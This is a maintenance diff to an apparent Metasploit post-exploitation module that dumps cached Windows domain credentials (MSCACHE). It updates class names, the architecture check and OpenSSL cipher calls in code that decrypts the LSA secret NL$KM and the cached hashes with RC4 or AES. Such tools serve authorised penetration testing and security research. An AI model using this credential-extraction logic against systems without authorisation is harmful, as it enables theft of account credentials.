@@ -6,7 +6,7 @@
 require 'msf/core'
 require 'rex'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
@@ -44,7 +44,7 @@ class Metasploit3 < Msf::Post
     if lsa_vista_style?
       nlkm_dec = decrypt_lsa_data(nlkm, lsakey)
     else
-      if sysinfo['Architecture'] =~ /wow64/i || sysinfo['Architecture'] =~ /x64/
+      if sysinfo['Architecture'] == ARCH_X64
         nlkm_dec = decrypt_secret_data(nlkm[0x10..-1], lsakey)
       else # 32 bits
         nlkm_dec = decrypt_secret_data(nlkm[0xC..-1], lsakey)
@@ -246,7 +246,7 @@ class Metasploit3 < Msf::Post
 
   def decrypt_hash(edata, nlkm, ch)
     rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), nlkm, ch)
-    rc4 = OpenSSL::Cipher::Cipher.new("rc4")
+    rc4 = OpenSSL::Cipher.new("rc4")
     rc4.key = rc4key
     decrypted  = rc4.update(edata)
     decrypted << rc4.final
@@ -255,7 +255,7 @@ class Metasploit3 < Msf::Post
   end
 
   def decrypt_hash_vista(edata, nlkm, ch)
-    aes = OpenSSL::Cipher::Cipher.new('aes-128-cbc')
+    aes = OpenSSL::Cipher.new('aes-128-cbc')
     aes.key = nlkm[16...-1]
     aes.padding = 0
     aes.decrypt
@@ -271,7 +271,7 @@ class Metasploit3 < Msf::Post
 
 
   def run
-    @credentials = Rex::Ui::Text::Table.new(
+    @credentials = Rex::Text::Table.new(
     'Header'    => "MSCACHE Credentials",
     'Indent'    => 1,
     'Columns'   =>
